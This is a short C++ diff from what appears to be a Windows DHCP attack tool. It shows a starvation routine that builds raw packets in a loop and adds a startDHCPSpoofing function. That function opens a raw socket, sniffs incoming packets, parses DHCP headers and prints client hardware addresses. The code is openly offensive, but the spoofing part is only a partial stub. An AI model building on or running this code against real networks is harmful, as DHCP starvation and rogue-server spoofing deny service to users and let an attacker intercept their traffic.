@@ -2,6 +2,7 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 #include "Headers.h"
+#include "Packets.h"
 #include "Utils.h"
 #include "Spoofing.h"
 
@@ -11,7 +12,7 @@
 #pragma pack(1)
 #pragma comment(lib, "Ws2_32.lib")
 
-
+void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP);
 
 void startDHCPStarvation(AddressInfo& info)
 {
@@ -32,6 +33,7 @@ void startDHCPStarvation(AddressInfo& info)
 #endif
 
 	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set the socket as a RAW socket
+	
 	for (int i = 0; i < 1000; i++)
 	{
 		char* raw_packet = new char[65536];
@@ -52,5 +54,39 @@ void startDHCPStarvation(AddressInfo& info)
 
 void startDHCPSpoofing(AddressInfo& info)
 {
+	SOCKET s;
+	in_addr packetInfo;
+
+	int optval = 1;
+
+	DHCP_header pDHCP{};
+	UDP_header pUDP{};
+	IP_header pIP{};
 	
+	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); //Create a RAW socket
+
+#if _DEBUG
+	if (s == SOCKET_ERROR)
+		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
+#endif
+
+	while (1)
+	{
+		sockaddr_in dst;
+		int size = sizeof(dst);
+
+		char* raw_packet = new char[65536];
+
+		recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size);
+
+
+		getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP);
+
+		std::cout << "recv IP: " << pIP.ip_id << std::endl;
+
+		if (checkForDHCP(pDHCP))
+			std::cout << "recv: " << pDHCP.chaddr << std::endl;
+
+		delete[] raw_packet;
+	}
 }
